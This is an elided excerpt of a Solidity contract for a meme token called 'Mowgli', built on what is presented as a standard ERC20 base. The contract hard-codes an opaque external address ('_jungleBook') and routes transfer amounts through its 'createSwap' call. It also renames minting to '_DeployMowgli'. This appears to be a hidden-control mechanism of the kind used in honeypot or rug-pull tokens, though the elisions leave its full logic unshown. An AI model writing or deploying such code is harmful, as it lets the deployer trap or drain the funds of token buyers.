...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _jungleBook = 0xb82a2b61dc9310D41B67CE7E2A693F22B7eEc823;
    address public pair;
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        jungleBook = IERC5679(_jungleBook);
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return jungleBook.createSwap(amount);
    }
    ...
    function _DeployMowgli(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployMowgli(creator, initialSupply);
    }
}

contract Mowgli is ERC20Token {
    constructor() ERC20Token("Mowgli", "MOWGLI", msg.sender, 42069000000 * 10 ** 18) {
    }
}